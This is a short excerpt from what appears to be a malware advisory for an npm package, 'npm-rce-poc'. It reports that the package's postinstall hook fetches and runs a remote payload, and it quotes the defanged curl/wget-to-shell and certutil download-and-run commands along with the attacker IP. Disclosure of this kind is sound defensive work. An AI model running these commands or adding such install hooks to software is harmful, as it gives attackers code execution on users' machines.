  "summary": "Security-research / proof-of-concept package: npm-rce-poc (npm)",
  "details": "The package ships a postinstall hook (postinstall.js) that downloads and executes a remote payload. On Linux/macOS it runs `curl -fsSL hxxp://115[.]190[.]124[.]243:8761/slt | sh` (falling back to wget). On Windows it uses certutil to download hxxp://115[.]190[.]124[.]243:8761/swt to C:\\Users\\Public\\run.bat and executes it. The bundled index.js is a decoy date-formatting library unrelated to the package's stated purpose.",
